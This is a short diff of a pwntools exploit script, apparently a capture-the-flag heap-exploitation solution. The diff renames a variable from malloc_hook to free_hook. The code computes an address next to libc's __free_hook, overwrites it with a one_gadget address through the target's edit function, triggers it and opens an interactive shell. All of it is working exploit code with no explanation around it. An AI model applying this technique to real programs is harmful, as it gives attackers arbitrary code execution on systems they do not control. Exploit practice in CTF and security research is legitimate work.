@@ -70,12 +70,12 @@ p.sendline(str(5))
 p.recvuntil(":")
 p.sendline(str(0))
 show()
-malloc_hook=libc_addr+libc.symbols['__free_hook']-0x28-8
+free_hook=libc_addr+libc.symbols['__free_hook']-0x28-8
 p.sendline("1312")
-edit("\x00"*0x20,malloc_hook,0,0,0)
+edit("\x00"*0x20,free_hook,0,0,0)
 one_gadget=libc_addr+0x4f322
 p.sendline("1313")
-edit("\x00"*0x30,malloc_hook,2,3,one_gadget)
+edit("\x00"*0x30,free_hook,2,3,one_gadget)
 p.sendline("1314")
 p.interactive()
 
